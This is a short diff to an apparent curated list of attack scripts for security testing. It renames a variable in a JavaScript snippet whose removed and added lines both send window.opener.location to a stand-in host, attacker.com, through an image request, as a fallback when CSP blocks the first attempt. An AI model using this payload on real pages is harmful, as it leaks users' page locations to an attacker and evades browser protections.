@@ -18,8 +18,8 @@ A curated list of script and attack for security testing purposes and knowledgem
       .catch(err => {
         // Error, maybe CSP :(
         
-        let fakeImage = new Image();
-        fakeImage.src = "//attacker.com/log/?location=" + window.opener.location
+        let bypassCSP = new Image();
+        bypassCSP.src = "//attacker.com/log/?location=" + window.opener.location
       });
     }
     ```  
